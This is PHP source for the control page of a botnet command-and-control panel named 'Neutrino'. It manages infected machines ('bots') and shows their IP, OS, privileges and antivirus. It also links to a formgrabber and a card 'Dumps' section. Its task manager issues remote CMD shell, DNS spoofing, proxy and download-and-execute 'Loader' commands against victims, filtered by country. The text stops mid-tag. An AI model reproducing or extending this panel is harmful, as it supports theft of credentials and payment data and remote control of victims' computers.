<?php
header('Content-Type: text/html; charset=utf8');
define('N3N', 1);
include('config.php');
include('functions.php');

global $key_tologin;
global $country_array;
global $page_limit;

if (!CheckGuest($key_tologin)) {
    NotFound();
}

$proto = 'http://';
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on' || $_SERVER['SERVER_PORT'] == 443) {
    $proto = 'https://';
}

include('./inc/auth.php');
session_start();

if (!array_key_exists('csrf', $_SESSION)) {
    $_SESSION['csrf'] = md5(md5(mt_rand() . microtime()));
}
?>
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html>
    <head>
        <title>-Neutrino-</title>
        <meta http-equiv='Content-Type' content='text/html; charset=utf-8'/>
        <script type='text/javascript' src='//code.jquery.com/jquery-1.12.0.min.js'></script>
        <link rel='stylesheet' href='//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css'>
        <link rel='stylesheet' href='//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css'>
        <script type='text/javascript' src='//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js'></script>
        <link rel='stylesheet' href='./css/custom.css'>
        <link rel='stylesheet' href='./css/datepicker.css'>
        <script type='text/javascript' src='./js/other.js'></script>
        <script type='text/javascript' src='./js/datepicker.js'></script>
        <script type='text/javascript' src='./js/dt.js'></script>
        <script type='text/javascript' src='./js/toggle.js'></script>
        <script type='text/javascript' src='./js/bootbox.js'></script>
    </head>
<body>
    <div class="navbar navbar-default">
        <div class="navbar-header">
            <a class="navbar-brand" href="" title="Refresh current page"> Neutrino </a>
        </div>
        <div class="navbar-collapse collapse navbar-responsive-collapse" style="text-align: center;">
            <ul class="nav navbar-nav" style="display: table-row; vertical-align: middle;">
                <li><a href="?act=tasks" title="Task"><span
                            style="vertical-align: middle;"><span
                                class="glyphicon glyphicon-list"></span> Task manager</span></a></li>
                <li><a href="?act=stats" title="Statistics"><span style="vertical-align: middle;"><span
                                class="glyphicon glyphicon-stats"></span> Statistics</span></a>
                </li>
                <li><a href="?act=clients" title="Clients"><span
                            style="vertical-align: middle;"><span
                                class="glyphicon glyphicon-user"></span> Clients</span></a></li>
                <li><a href="?act=ff" title="Formgrabber"><span style="vertical-align: middle;"><span
                                class="glyphicon glyphicon-globe"></span> Formgrabber</span></a>
                </li>
                <li><a href="?act=logs" title="Logs"><span style="vertical-align: middle;"><span
                                class="glyphicon glyphicon-list-alt"></span> Files & Logs</span></a>
                </li>
                <li><a href="?act=dumps" title="Logs"><span style="vertical-align: middle;"><span
                                class="glyphicon glyphicon-credit-card"></span> Dumps</span></a>
                </li>
                <li><a href="?act=proxy" title="Logs"><span style="vertical-align: middle;"><span
                                class="glyphicon glyphicon-globe"></span> Proxy list</span></a>
                </li>
                <li><a href="?act=settings" title="Settings"><span style="vertical-align: middle;"><span
                                class="glyphicon glyphicon-cog"></span> Settings</span></a>
                </li>
            </ul>
            <ul class="nav navbar-nav navbar-right">
                <li><a href="?act=upload" title="Upload"><span
                            style="vertical-align: middle;"><span
                                class="glyphicon glyphicon-upload"></span> Upload</span></a></li>
                <li><a href="?act=logout" title="Logout"><span
                            style="vertical-align: middle;"><span class="glyphicon glyphicon-off"></span> Logout</span></a>
                </li>
            </ul>
        </div>
    </div>
<?php
$main_url = $proto . $_SERVER['SERVER_NAME'] . substr(str_replace('\\', '/', realpath(__DIR__)), strlen(str_replace('\\', '/', realpath($_SERVER['DOCUMENT_ROOT'])))) . '/';

$mysqli = ConnectMySQLi($db_host, $db_login, $db_password, $db_database);
$acc_type = $mysqli->query('SELECT uid FROM users WHERE uid = "' . $_COOKIE['uid'] . '"')->fetch_object()->uid;

$country_codes = $GLOBALS['ccode'];
$country_names = $GLOBALS['cname'];

$act = array_key_exists('act', $_GET) ? $_GET['act'] : 'tasks';
$do = array_key_exists('do', $_GET) ? $_GET['do'] : '';
$task_id = array_key_exists('task_id', $_GET) ? $_GET['task_id'] : '';
$task_act = array_key_exists('task', $_GET) ? $_GET['task'] : '';

if ($task_act) {
    task_action($mysqli, $task_id, $task_act);
}
if ($act == 'tasks' || $act == null) {

    $res = $mysqli->query('SELECT * FROM botnet_tasks');
    if ($res->num_rows > 0) {
        echo '<table class="table table-striped table-hover" align="center">' .
            '<tr style="vertical-align: middle;"><th>#</th>' .
            '<th><b> User </th>' .
            '<th><b> Task ID : Number </th>' .
            '<th><b> Creation date </th>' .
            '<th><b> Command </th>' .
            '<td style="text-align: center"><b> Status </td>' .
            '<td style="text-align: center"><b> Executed \ Need \ Failed </td>' .
            '<td style="text-align: center"><b> Country </td>' .
            '<td style="text-align: center"><b> Build id </td>' .
            '<td style="text-align: center">' .
            '<li class="pull-right dropdown" style ="list-style-type: none;">' .
            '<a style="text-decoration: none;" class="dropdown-toggle" data-toggle="dropdown" href="#"> Action <span class="caret"></span></a>' .
            '<ul class="dropdown-menu" style="text-align:left">' .
            '<li><a href="?act=tasks&task=start_all_tasks"><span class="glyphicon glyphicon-play"></span> Run all tasks</a></li>' .
            '<li><a href="?act=tasks&task=stop_all_tasks"><span class="glyphicon glyphicon-stop"></span> Stop all tasks</a></li>' .
            '<li class="divider"></li>' .
            '<li><a href="#" onclick=ConfirmDelete("?act=tasks&task=kill_all_tasks");><span class="glyphicon glyphicon-trash"></span> Delete all tasks</a></li>' .
            '</ul>' .
            '</li>' .
            '</td>';

        for ($i = 0; $i < $res->num_rows; $i++) {
            $row = $res->fetch_assoc();
            echo '<tr class="active">' .
                '<td>' . $i . '</td>' .
                '<td> <i>' . $row['by_user'] . '</i></td>' .
                '<td>' . $row['task_id'] . ' : ' . $row['id'] . '</td>' .
                '<td> <i>' . $row['task_date'] . '</i></td>' .
                '<td>' . '<span class="label label-info"><b>' . CmdParser($row['tasks_pref']) . '</b></span> &nbsp;' . urldecode($row['command']) . CmdParser($row['tasks_postf']) . '</td>';

            if ($row['status'] == 1) {
                echo '<td style="text-align: center;vertical-align:middle;"><span class="label label-success"><b> START </b></span></td>';
            } else {
                echo '<td style="text-align: center;vertical-align:middle;"><span class="label label-danger"><b> STOP </b></span></td>';
            }
            echo '<td style="text-align: center">' . $row['execs'] . " \\ " . $row['needexecs'] . " \\ " . $row['failed'] . '</td>' .
                '<td style="text-align: center;vertical-align:middle;">' . ShowFlag($row['bots'], $country_array[$row['bots']]) . '</td>' .
                '<td style="text-align: center;vertical-align:middle;">' . $row['build_id'] . '</td>' .
                '<td style="text-align: right;">' .
                '<a href = "?act=tasks&task_id=' . $row['task_id'] . '&task=start" title=Start><span class="glyphicon glyphicon-play"></span></span></a>' .
                '<a href = "?act=tasks&task_id=' . $row['task_id'] . '&task=stop" title=Stop><span class="glyphicon glyphicon-stop"></span></a>' .
                '&nbsp;' .
                '<a href = "?act=tasks&task_id=' . $row['task_id'] . '&task=repeat" title=Reload><span class="glyphicon glyphicon-retweet"></span></a>' .
                '&nbsp;' .
                '<a href = "#"  onclick=ConfirmDelete("?act=tasks&task_id=' . $row['task_id'] . '&task=kill"); title=Delete><span class="glyphicon glyphicon-remove"></span></a>' .
                '</td>' .
                '</tr>';
        }
        echo '</td></tr><tr><tbody></table>';
    }
    ?>

    <div class="panel-group" id="accordion" style="width: 60%;margin: 0 auto;">
        <div class="panel panel-default" id="panel1">
            <div class="panel-heading">
                <h4 class="panel-title" style="text-align: center">
                    <a href="#" onclick="toggle(tasks_examples); return false;" title="Show options panel">show / hide
                        tasks
                        examples</a>
                </h4>
            </div>
            <div id="tasks_examples" class="panel-collapse collapse">
                <div class="panel-body">
                    <table class="table-condensed table-hover">
                        <tr class="active">
                            <td><b>Command</b></td>
                            <td><b>Options</b></td>
                            <td><b>Example</b></td>
                            <td><b>Description</b></td>
                        </tr>
                        <tr class="active">
                            <td><b>Start proxy</b></td>
                            <td> IP:PORT HOURS</td>
                            <td>127.0.0.1:7777 2</td>
                            <td>ip:port_of_backconnect_server hours</td>
                        </tr>
                        <tr class="active">
                            <td><b>Find file</b></td>
                            <td> filename.ext count(max. 200)</td>
                            <td>notepad.exe 3</td>
                            <td>You can specify a partial name, ex: "notepa"</td>
                        </tr>
                        <tr class="active">
                            <td><b>DNS Spoofing</b></td>
                            <td>original.com spoofed.com</td>
                            <td>google.com locked.com</td>
                            <td>type "remove" for delete redirect</td>
                        </tr>
                        <tr class="active">
                            <td><b>CMD shell</b></td>
                            <td>command param</td>
                            <td>notepad readme.txt</td>
                            <td>---------</td>
                        </tr>
                        <tr class="active">
                            <td><b>CMD shell (with results)</b></td>
                            <td>command param</td>
                            <td>notepad readme.txt</td>
                            <td>---------</td>
                        </tr>
                        <tr class="active">
                            <td><b>Find process</b></td>
                            <td>processname</td>
                            <td>---------</td>
                            <td>You can specify a partial name, ex: "processna"</td>
                        </tr>
                        <tr class="active">
                            <td><b>Plugin</b></td>
                            <td>http://example.ru/plugin.n</td>
                            <td>http://example.ru/ammy.n</td>
                            <td>---------</td>
                        </tr>
                        <tr class="active">
                            <td><b>Loader</b></td>
                            <td>http://example.ru/file.ext param</td>
                            <td>http://example.ru/bot.exe debug</td>
                            <td>---------</td>
                        </tr>
                        <tr class="active">
                            <td><b>Update</b></td>
                            <td>http://example.ru/file.exe</td>
                            <td>---------</td>
                            <td>---------</td>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
    </div>
    <br>
    <form action='' method='post'>
        <div class="panel panel-default" style="width: 60%;margin: 0 auto;">
            <div class="panel-body">
                <div class="input-group" style="width: 30%;float: left;">
                    <span class="input-group-addon">Command type :</span>
                    <select name="type_attack" class="form-control">
                        <option>DNS Spoofing</option>
                        <option>Start proxy</option>
                        <option>Find file</option>
                        <option>CMD shell</option>
                        <option>CMD shell (with results)</option>
                        <option>Find process</option>
                        <option>Plugin</option>
                        <option>Loader</option>
                        <option>Update</option>
                    </select>
                </div>
                <input type="text" style="width: 69%;margin-left:3px;" class="form-control"
                       placeholder="Enter the command parameters..."
                       size="150"
                       name="urls" id="urls">
                <br>

                <div style="float: left;">
                    <input type="hidden" name="by_id" checked="checked" value="uid">

                    <div class="input-group" style="width: 24%;float: left;">
                        <span class="input-group-addon">By country :</span>
                        <select name="country" class="form-control">
                            <option class="icon" value="ALL"> All countries</option>
                            <?php
                            for ($i = 1; $i < 247; $i++) {
                                echo '<option value=' . $country_codes[$i] . ' >' . $country_codes[$i] . ' | ' . $country_names[$i] . ' </option>';
                            }
                            ?>
                        </select>
                    </div>
                    <div class="input-group" style="width: 24%;float: left; margin-left:3px;">
                        <span class="input-group-addon">By build id :</span>
                        <select name="build_id" class="form-control">
                            <option class="icon" value="ALL"> All bots</option>
                            <?php
                            $query = $mysqli->query("SELECT bot_build_id, COUNT(*) AS counter FROM botnet_bots GROUP BY bot_build_id");
                            while ($row = $query->fetch_array()) {
                                echo '<option value="' . $row['bot_build_id'] . '"> ' . urldecode($row['bot_build_id']) . ' (' . $row['counter'] . ')' . '</option>';
                            }
                            ?>
                        </select>
                    </div>

                    <div class="input-group" style="width: 26%;float: left; margin-left:3px;">
                        <span class="input-group-addon">By machine id :</span>
                        <?php echo '<input type="text" class="form-control" name="bot_uid" size="50" value="';
                        if (array_key_exists('bot_uid', $_GET)) {
                            echo htmlentities($mysqli->real_escape_string($_GET['bot_uid']));
                        }
                        echo '"/>';
                        ?>
                    </div>

                    <div class="input-group" style="width: 24%;float: left; margin-left:3px;">
                        <span class="input-group-addon">Limit :</span>
                        <input type="text" class="form-control" placeholder="0 - unlim" name='execs'>
                    </div>
                </div>
            </div>
        </div>
        <br>

        <div style="text-align: center;">
            <input class="btn btn-default" type="submit" name="create_task" title="Create task" value="Create task">
        </div>
        <input name="csrf" type="hidden" value="<?php echo $_SESSION['csrf'] ?>">
    </form>
    <?php
}
if ($act == 'stats') {
    ?>
    <script type="text/javascript" src="https://www.google.com/jsapi"></script>
    <div class="preloader loaderimg"></div>
<?php
$time = (time() - (60 * refresh_rate($mysqli, 'get', null)));

if (array_key_exists('bot', $_GET) == 'kill') {
    $layer_url = mysqli_real_escape_string($mysqli, $_GET['layer_url']);
    QueryRedirect($mysqli, "DELETE FROM p_layer WHERE layer_url='" . $layer_url . "'", $stats_url);
}

if (array_key_exists('kill_all', $_POST)) {
    if ($_SESSION['csrf'] == $_POST['csrf']) {
        $mysqli->query('truncate table botnet_bots');
    }
}

if (array_key_exists('kill_off', $_POST)) {
    if ($_SESSION['csrf'] == $_POST['csrf']) {
        $mysqli->query('DELETE FROM botnet_bots WHERE bot_time < ' . $time);
    }
}
if (array_key_exists('kill_ban', $_POST)) {
    if ($_SESSION['csrf'] == $_POST['csrf']) {
        $mysqli->query('truncate table banned');
    }
}

$bots_total = $mysqli->query('SELECT * FROM botnet_bots')->num_rows;
if ($bots_total > 0) {
include_once './inc/chart.php';

$bots_online = $mysqli->query('SELECT * FROM botnet_bots WHERE bot_time > ' . $time)->num_rows;
$bots_offline = $mysqli->query('SELECT * FROM botnet_bots WHERE `bot_time` < ' . $time)->num_rows;
$bots_hour = $mysqli->query('SELECT * FROM botnet_bots WHERE ' . time() . ' - bot_time < ' . (60 * 60))->num_rows;
$bots_day = $mysqli->query('SELECT * FROM botnet_bots WHERE ' . time() . ' - bot_time < ' . (60 * 60 * 24))->num_rows;
$bots_banned = $mysqli->query('SELECT * FROM banned')->num_rows;

GetSmallStat($bots_online, $bots_offline, $bots_hour, $bots_day, $bots_total, $bots_banned);
?>
    <div style="text-align: center;">
        <form method="post" action="">
            <div class="btn-group   ">
                <button type="submit" class="btn btn-default btn-xs" name="kill_all">Clear stat</button>
                <button type="submit" class="btn btn-default btn-xs" name="kill_off">Clear offline</button>
                <button type="submit" class="btn btn-default btn-xs" name="kill_ban">Clear banned</button>
            </div>
            <input name="csrf" type="hidden" value="<?php echo $_SESSION['csrf']; ?>">
        </form>
    </div>
    <div class="container" style="width: 100%;">
        <div class="row">
            <div class="col-md-7">
                <div id="div_geo_map"></div>
            </div>
            <div class="col-md-4">
                <div id="div_top_statistics"></div>
                <div id="div_os_statistics"></div>
            </div>
        </div>
    </div>
    <?php
} else {
    WarningBox('No bots in database!');
}
}
if ($act == 'clients') {

    if (array_key_exists('bot', $_GET)) {
        if ($_SESSION['csrf'] != $_GET['csrf'])
            return;
        $bot_uid = $mysqli->real_escape_string($_GET['bot_uid']);
        QueryRedirect($mysqli, "DELETE FROM botnet_bots WHERE bot_uid='" . $bot_uid . "'", $bots_url);
    }
    if (array_key_exists('bot_comment', $_GET)) {
        if ($_SESSION['csrf'] != $_GET['csrf'])
            return;

        $bot_uid = $mysqli->real_escape_string($_GET['bot_uid']);
        $bot_comment = htmlspecialchars($mysqli->real_escape_string($_GET['bot_comment']));
        QueryRedirect($mysqli, "UPDATE botnet_bots SET bot_comment = '" . $bot_comment . "'  WHERE bot_uid='" . $bot_uid . "'", $bots_url);
    }

    $sql = 'SELECT * FROM botnet_bots';
    $by_countries = array_key_exists('countries', $_GET) ? htmlentities($_GET['countries']) : 'ALL';
    $by_status = array_key_exists('status', $_GET) ? htmlentities($_GET['status']) : 'total';
    $by_os = array_key_exists('os', $_GET) ? htmlentities($_GET['os']) : 0;
    $by_ip = array_key_exists('bot_ip', $_GET) ? htmlentities($_GET['bot_ip']) : 0;
    $by_uid = array_key_exists('bot_uid', $_GET) ? htmlentities($_GET['bot_uid']) : 0;
    $by_name = array_key_exists('bot_name', $_GET) ? htmlentities($_GET['bot_name']) : 0;
    $by_build_id = array_key_exists('build_id', $_GET) ? htmlentities($_GET['build_id']) : 0;
    $refresh_rate = (60 * refresh_rate($mysqli, 'get', null));

    if ($by_countries) {
        if ($by_countries != 'ALL') {
            $sql .= " WHERE bot_country = '" . $mysqli->real_escape_string($by_countries) . "'";
        } else {
            if ($by_status != 'total') {
                $sql .= " WHERE bot_country = '" . $mysqli->real_escape_string($by_countries) . "'";
            }
        }
    }
    if ($by_status != 'total') {
        if (strpos($sql, ' WHERE ') == FALSE) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        if ($_GET['status'] == 'offline') {
            $sql .= time() . ' - bot_time > ' . $refresh_rate;
        } else {
            if ($_GET['status'] == 'online') {
                $sql .= time() . ' - bot_time < ' . $refresh_rate;
            }
        }
    }
    if ($by_os) {
        if (strpos($sql, ' WHERE ') == FALSE) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "bot_os LIKE '%" . $mysqli->real_escape_string($by_os) . "%'";
    }
    if ($by_ip) {
        if (strpos($sql, ' WHERE ') == FALSE) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "bot_ip LIKE '%" . $mysqli->real_escape_string($by_ip) . "%'";
    }
    if ($by_uid) {
        if (strpos($sql, ' WHERE ') == FALSE) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "bot_uid LIKE '%" . $mysqli->real_escape_string(urlencode($by_uid)) . "%'";
    }
    if ($by_name) {
        if (strpos($sql, ' WHERE ') == FALSE) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "FROM_BASE64(bot_name) LIKE '%" . $mysqli->real_escape_string(urlencode($by_name)) . "%'";
    }
    if ($by_build_id) {
        if (strpos($sql, ' WHERE ') == FALSE) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "bot_build_id = '" . $mysqli->real_escape_string($by_build_id) . "'";
    }
    $sql .= ' ORDER BY bot_time DESC';


    $page = array_key_exists('page', $_GET) ? $_GET['page'] : 0;
    $count_records = $mysqli->query($sql)->num_rows;
    $count_pages = floor($count_records / $page_limit);

    if ($page) {
        $lim = floor($page * $page_limit);
        $sql .= " LIMIT $lim, $page_limit";
    } else {
        $sql .= " LIMIT 0, $page_limit";
    }

    $str = null;
    foreach (explode('&', $_SERVER['QUERY_STRING']) as $s_str) {
        if (strpos($s_str, 'page')) {
            break;
        } else {
            $str .= htmlspecialchars($s_str) . '&';
        }
    }

    $res = $mysqli->query($sql);
    if ($res->num_rows != 0) {
        ?>
        <div class="modal fade" id="confirm-delete">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                        <h4 class="modal-title">Search filter</h4>
                    </div>
                    <form method="GET" action="">
                        <div class="modal-body">
                            <input type="hidden" name="act" value="clients">

                            <div class="radio">
                                <label>
                                    <input type="radio" class="regular-radio" checked="checked" name="status"
                                           value="online">Show only
                                    online bots
                                </label>
                                <br>
                                <label>
                                    <input type="radio" name="status" value="total">Show all online & offline
                                    bots
                                </label>
                                <br>
                                <label>
                                    <input type="radio" name="status" value="offline">Show only offline bots
                                </label>
                            </div>
                            <div class="input-group">
                                <span class="input-group-addon">By country :&nbsp;&nbsp;&nbsp;</span>
                                <select class="form-control" name="countries" style="width: 100%">
                                    <option value=ALL> All countries</option>
                                    <?php
                                    for ($i = 1; $i < 247; $i++) {
                                        echo '<option value=' . $country_codes[$i] . '>' . ' ' . $country_codes[$i] . ' | ' . $country_names[$i] . ' </option>';
                                    }
                                    ?>
                                </select>
                            </div>

                            <div class="input-group">
                            <span
                                class="input-group-addon">By bot id :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
                                <input class="form-control" id="bot_uid" name="bot_uid" type="text">
                            </div>

                            <div class="input-group">
                                <span class="input-group-addon">By name :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
                                <input class="form-control" id="bot_name" name="bot_name" type="text">
                            </div>

                            <div class="input-group">
                            <span
                                class="input-group-addon">By bot ip :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
                                <input class="form-control" id="bot_ip" name="bot_ip" type="text">
                            </div>

                            <div class="input-group">
                                <span class="input-group-addon">By bot OS :&nbsp;&nbsp;&nbsp;&nbsp;</span>
                                <select class="form-control" name="os" style="width: 100%">
                                    <option value=""> All OS</option>
                                    <?php
                                    $query = $mysqli->query("SELECT bot_os,COUNT(*) AS CNT FROM botnet_bots GROUP BY bot_os");
                                    while ($row = $query->fetch_array()) {
                                        echo '<option value="' . $row['bot_os'] . '"> ' . urldecode($row['bot_os']) . '</option>';
                                    }
                                    ?>
                                </select>
                            </div>
                            <div class="input-group">
                                <span class="input-group-addon">By build id :&nbsp;&nbsp;&nbsp;</span>
                                <select class="form-control" name="build_id" style="width: 100%">
                                    <option value=""> All bots</option>
                                    <?php
                                    $query = $mysqli->query("SELECT bot_build_id, COUNT(*) AS counter FROM botnet_bots GROUP BY bot_build_id");
                                    while ($row = $query->fetch_array()) {
                                        echo '<option value="' . $row['bot_build_id'] . '"> ' . urldecode($row['bot_build_id']) . ' (' . $row['counter'] . ')' . '</option>';
                                    }
                                    ?>
                                </select>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="submit" class="btn btn-primary btn-ok" name="filter">Search</button>
                            <button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="panel panel-primary" style="margin: 0 auto;overflow: hidden; font-size: calc(7px + 0.3vw)">
            <div class="panel-heading"><b>Clients (<?php echo $count_records; ?>)</b></div>
            <form action="" method="GET" class="navbar-form navbar-right" role="search">
                <input type="hidden" name="act" value="clients">

                <div class="form-group">
                    <input class="form-control" name="bot_name" placeholder="Search by name" type="text">
                </div>
                <button type="submit" name="filter" class="btn btn-default">Submit</button>
                <div class="btn-group">
                    <a href="#" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
                        Menu
                        <span class="caret"></span>
                    </a>
                    <ul class="dropdown-menu">
                        <li><a data-toggle="modal"
                               data-target="#confirm-delete" href="#"><span class="glyphicon glyphicon-search"></span>
                                Advanced search</a></li>
                    </ul>
                </div>
            </form>
            <div>
                <?php
                echo '<table class="table table-responsive table-striped table-condensed table-hover">' .
                    '<th><b>ID</b></th>' .
                    '<th><b>Name : Domain : Computer</b></th>' .
                    '<th><b>IP</b>' .
                    '<th><b>OS</b></th>' .
                    '<th><b>Priv.</b></th>' .
                    '<th><b>Antivirus</b></th>' .
                    '<th><b>Country</b></th>' .
                    '<th style="text-align: center;"><b>Version</b></th>' .
                    '<th><b>Build id</b></th>' .
                    '<th><b>Status</b></th>' .
                    '<th><b>Install date</b></th>' .
                    '<th style="text-align: center;"><b>Options</b></th>' .
                    '<tbody>';

                for ($i = 0; $i < $res->num_rows; $i++) {
                    $row = $res->fetch_assoc();
                    echo '<div class="modal fade" id="add-comment-' . $i . '">'
                        . '<div class="modal-dialog">'
                        . '<div class="modal-content">'
                        . '<div class="modal-header">'
                        . '<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>'
                        . '<h4 class="modal-title">Add comment to \'' . $row['bot_uid'] . '\'</h4>'
                        . '</div>'
                        . '<form method="GET" action="">'
                        . '<input type="hidden" name="act" value="clients">'
                        . '<input type="hidden" name="bot_uid" value="' . $row['bot_uid'] . '">'
                        . '<input name="csrf" type="hidden" value="' . $_SESSION['csrf'] . '">'
                        . '<textarea style="width:100%;resize: none;" rows="10" cols="45" name="bot_comment">'
                        . $row['bot_comment']
                        . '</textarea>'
                        . '<div class="modal-footer">'
                        . '<button type="submit" class="btn btn-primary btn-ok" name="comment">Save</button>'
                        . '<button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>'
                        . '</div>'
                        . '</form>'
                        . '</div>'
                        . '</div>'
                        . '</div>';

                    echo '<tr class="active">';
                    echo '<td><a href = "?act=ff&show_by_uid=' . $row['bot_uid'] . '" title="Show bot logs">' . $row['bot_uid'] . '</td>' .
                        '<td>' . base64_decode(urldecode($row['bot_name'])) . '</a></td>' .
                        '<td>' . $row['bot_ip'] . '</td>' .
                        '<td>' . urldecode($row['bot_os']) . '</td>' .
                        '<td>' . ($row['bot_priv'] ? 'Admin' : 'User') . '</td>' .
                        '<td>' . urldecode($row['bot_av']) . '</td>' .
                        '<td style="vertical-align: middle;">' . ShowFlag($row['bot_country'], $country_array[$row['bot_country']]) . '&nbsp;' . $country_array[$row['bot_country']] . '(' . $row['bot_country'] . ')' . '</td>' .
                        '<td style="text-align: center;">' . $row['bot_version'] . '</td>';

                    echo '<td>' . urldecode($row['bot_build_id']) . '</td>';
                    if ((int)$row['bot_time'] > (time() - $refresh_rate)) {
                        echo '<td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAAAQCAMAAACC7snvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkQ3RjQwMjI0MzlFODExRTRBNDg1ODJFMUI0NjVGQzA4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkQ3RjQwMjI1MzlFODExRTRBNDg1ODJFMUI0NjVGQzA4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RDdGNDAyMjIzOUU4MTFFNEE0ODU4MkUxQjQ2NUZDMDgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RDdGNDAyMjMzOUU4MTFFNEE0ODU4MkUxQjQ2NUZDMDgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5Fk6I0AAAAP1BMVEX///8AMwAAPgAAdAAAjwAAkQAAlAAAlgAAmAAAmQAAmgAAmwAAngAAoQAAowAAqQAArAAArQAArgAA/wD///+npAnLAAAAAXRSTlMAQObYZgAAAM9JREFUOMutk9sOwyAMQ4EMmrb0tuX/v3V26Z6WrZPWcGRFkWPBAyGEdEEFVHpcUIk59+H+N0hK27BdAIKGdT3Dzj0IWpaerP36sTGxMw+DuuUMk16+e2YEdfPsYmYdhSq2d5g3fSeFOE3Fw2YRm0ya8qAr+9TzM6jU6mBSKteb8lR2LHH8MUQ/px6Lh+5dafcScfwIGsfsYTJmLjblyeOhnh9BmtUFb1Au6itI0XGaxfEj6KbqgzeoChuoQG9Q5dQxR3w2/Rj1O/v3jxdUCE92yC3ZVzx+VgAAAABJRU5ErkJggg==" title="Last access: ' . $row['bot_date'] . '"></td>';
                    } else {
                        echo '<td><img 